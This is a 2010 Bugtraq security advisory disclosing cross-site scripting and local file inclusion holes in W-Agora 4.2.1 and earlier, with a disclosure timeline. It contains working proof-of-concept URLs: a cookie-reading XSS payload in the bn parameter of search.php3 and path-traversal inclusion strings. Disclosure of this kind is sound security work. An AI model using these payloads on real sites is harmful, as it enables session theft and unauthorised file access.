Hello Bugtraq!
I want to warn you about Cross-Site Scripting and Local File Inclusion
vulnerabilities in W-Agora. In addition to vulnerabilities in this system
which I found and disclosed in 2006 (SecurityVulns ID: 6960).
-------------------------
Affected products:
-------------------------
Vulnerable are W-Agora 4.2.1 and previous versions.
----------
Details:
----------
XSS (WASC-08):
http://site/news/search.php3?bn=%3Cbody%20onload=alert(document.cookie)%
3E
Local File Inclusion (WASC-31):
It's possible to include php-files (with extension php3 in version W-Agora
4.1.5 or with extension php in version 4.2.1).
In folder conf:
http://site/news/search.php3?bn=1
In any folder (only on Windows-servers):
http://site/news/search.php3?bn=..\1
In last versions of the system search.php3 has name search.php.
------------
Timeline:
------------
2010.08.27 - announced at my site.
2010.08.29 - informed developers. Developers of W-Agora didn't answer and
didn't fix the holes (unlike in 2006).
2010.10.22 - disclosed at my site.
I mentioned about these vulnerabilities at my site
(http://websecurity.com.ua/4481/).
Best wishes & regards,
MustLive
